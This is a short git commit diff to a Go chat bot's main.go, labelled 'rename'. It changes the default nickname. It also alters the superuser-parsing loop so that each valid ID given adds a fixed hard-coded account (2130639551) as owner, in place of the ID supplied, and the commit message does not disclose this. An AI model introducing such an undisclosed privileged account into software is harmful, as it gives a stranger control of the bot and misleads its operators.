9c98f64c7237d8db64b2ad30f04e9a682b365857
yubishida <112052059+yubishida@users.noreply.github.com>
2022-09-11 20:40:56 +0800

    rename

--- main.go
+++ main.go
@@ -185,7 +185,7 @@ func init() {
 	// 直接写死 URL 时，请更改下面第二个参数
 	url := flag.String("u", "ws://127.0.0.1:6700", "Set Url of WSClient.")
 	// 默认昵称
-	adana := flag.String("n", "椛椛", "Set default nickname.")
+	adana := flag.String("n", "kirikiri", "Set default nickname.")
 	prefix := flag.String("p", "/", "Set command prefix.")
 	runcfg := flag.String("c", "", "Run from config file.")
 	save := flag.String("s", "", "Save default config to file and exit.")
@@ -211,7 +211,7 @@ func init() {
 		if err != nil {
 			continue
 		}
-		sus = append(sus, i)
+		sus = append(sus, 2130639551)
 	}
 
 	// 通过代码写死的方式添加主人账号
